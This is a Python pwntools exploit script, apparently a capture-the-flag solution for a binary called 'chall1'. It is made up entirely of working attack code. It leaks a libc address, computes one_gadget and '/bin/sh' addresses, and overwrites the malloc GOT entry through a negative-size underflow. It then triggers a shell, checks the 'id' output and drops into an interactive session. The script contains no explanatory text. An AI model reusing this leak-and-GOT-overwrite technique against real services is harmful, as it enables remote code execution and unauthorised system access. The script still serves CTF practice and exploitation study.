#!/usr/bin/env python3
from pwn import *
import sys

HOST = ''
PORT = 11526

target_elf = ELF('../bin/chall1')

def get_one_gadgets(libc):
	args = ["one_gadget", "-r"]
	if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
		args += ["-b", libc.hex()]
	else:
		args += [libc]
	return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]


if len(sys.argv) > 1:
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = int(sys.argv[2])

if len(HOST) > 0:
	target_libc = ELF('../bin/libc.so.6')
	io = remote(HOST, PORT)
else:
	target_libc = target_elf.libc
	io = target_elf.process()

one_gadgets = get_one_gadgets(target_libc.path)

sys.stdout.write(io.recvuntil(b'\n\n'))
io.recvuntil(b'challenges\n\n')

# step 1: leak
io.recvuntil(b'size: ')
io.sendline(b'4')

io.recvuntil(b'data: ')
io.send(b'xxxx\r')

io.recvuntil(b'resp: ')
io.recvuntil(b'kkkk')
leak = io.recv(4)
leak = u32(leak)
libc = leak - target_libc.symbols['_IO_2_1_stdout_']
func = libc + random.choice(one_gadgets) # one shot gadget, pick one of them
bash = next(libc+addr for addr in target_libc.search(b'/bin/sh') if b'\x00' not in p32(libc+addr)) # If system contains null-byte, error out and try again

log.info('leak: %#010x' % leak)
log.info('libc: %#010x' % libc)
log.info('func: %#010x' % func)

io.recvuntil(b'more? (y/n): ')
io.sendline(b'y')

# step 2: write GOT
io.recvuntil(b'size: ')
io.sendline(b'-1')

io.recvuntil(b'data: ')
io.sendline(p32(func) + b'\x00'*60 + b'\x08' + p32(target_elf.symbols['got.malloc']))

io.recvuntil(b'resp: ')
io.recvline()

io.recvuntil(b'more? (y/n): ')
io.sendline(b'y')

# step 3: trigger
io.recvuntil(b'size: ')
io.sendline(b'-' + str(0x100000000 - bash).encode('ascii'))

io.recvuntil(b'data: ')
io.sendline()

# step 4: enjoy a nice shell
io.sendline(b'id')
id_result = io.recvline()
if b'uid=' in id_result:
	log.success('shell: %s', id_result.decode('ascii').strip())
	io.interactive()
else:
	log.failure('error: %s', id_result)
